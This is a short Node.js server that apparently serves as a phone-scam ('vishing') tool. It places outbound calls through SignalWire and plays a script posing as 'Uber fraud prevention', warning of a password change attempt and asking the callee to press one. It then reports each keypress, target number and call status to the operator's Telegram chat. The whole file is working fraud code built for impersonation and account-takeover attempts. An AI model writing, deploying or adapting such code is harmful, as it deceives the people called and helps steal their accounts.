import express from "express";
import got from "got";
import { RestClient } from "@signalwire/node";

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const TG = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
const CHAT = process.env.TELEGRAM_CHAT_ID;
const SPACE = process.env.SW_SPACE_URL;
const PROJ = process.env.SW_PROJECT_ID;
const TOKEN = process.env.SW_API_TOKEN;
const FROM = process.env.SW_FROM_NUMBER;
const MUSIC = process.env.MUSIC_URL || "https://api.twilio.com/cowbell.mp3";

async function tg(text) {
 try {
   await got.post(`${TG}/sendMessage`, { json: { chat_id: CHAT, text, parse_mode: "HTML" } });
 } catch (e) { console.log("TG error:", e.message); }
}

app.post("/sw/incoming", (req, res) => {
 const vr = [];
 vr.push(`<Response>`);
 vr.push(`<Gather input="dtmf" numDigits="1" action="https://${req.headers.host}/sw/gather" method="POST">`);
 vr.push(`<Say voice="alice" language="en-US">This is Uber fraud prevention line. We detected a password change attempt. If this was not you, please press one.</Say>`);
 vr.push(`<Play>${MUSIC}</Play>`);
 vr.push(`</Gather>`);
 vr.push(`<Say voice="alice">No input received. Goodbye.</Say>`);
 vr.push(`<Hangup/>`);
 vr.push(`</Response>`);
 res.type("text/xml").send(vr.join("\n"));
});

app.post("/sw/gather", async (req, res) => {
 const digits = (req.body.Digits || "").trim();
 const sid = req.body.CallSid || "-";
 await tg(`📞 User pressed: <b>${digits}</b>\nCallSid: <code>${sid}</code>`);
 if (digits === "1") {
   res.type("text/xml").send(`<Response><Say voice="alice">Thank you. We will secure your account.</Say><Play>${MUSIC}</Play></Response>`);
 } else {
   res.type("text/xml").send(`<Response><Say voice="alice">Invalid input. Goodbye.</Say><Hangup/></Response>`);
 }
});

app.post("/sw/outbound", async (req, res) => {
 const { to } = req.body;
 const client = new RestClient(PROJ, TOKEN, { signalwireSpaceUrl: SPACE });
 try {
   const call = await client.calls.create({
     to,
     from: FROM,
     url: `https://${req.headers.host}/sw/incoming`,
     statusCallback: `https://${req.headers.host}/sw/status`,
     statusCallbackMethod: "POST",
   });
   await tg(`📲 Outbound call started to <b>${to}</b>\nSID: <code>${call.sid}</code>`);
   res.json({ ok: true });
 } catch (e) {
   await tg(`⚠️ Outbound failed: ${e.message}`);
   res.status(500).json({ ok: false, error: e.message });
 }
});

app.post("/sw/status", async (req, res) => {
 const { CallStatus, CallSid, To, From } = req.body || {};
 await tg(`📞 Status: <b>${CallStatus || 'unknown'}</b>\nTo: ${To || '-'}\nFrom: ${From || '-'}\nSID: <code>${CallSid || '-'}</code>`);
 res.json({ ok: true });
});

app.get("/", (req, res) => res.send("SignalWire IVR running ✅"));
app.listen(3000, () => console.log("Server running on port 3000"));
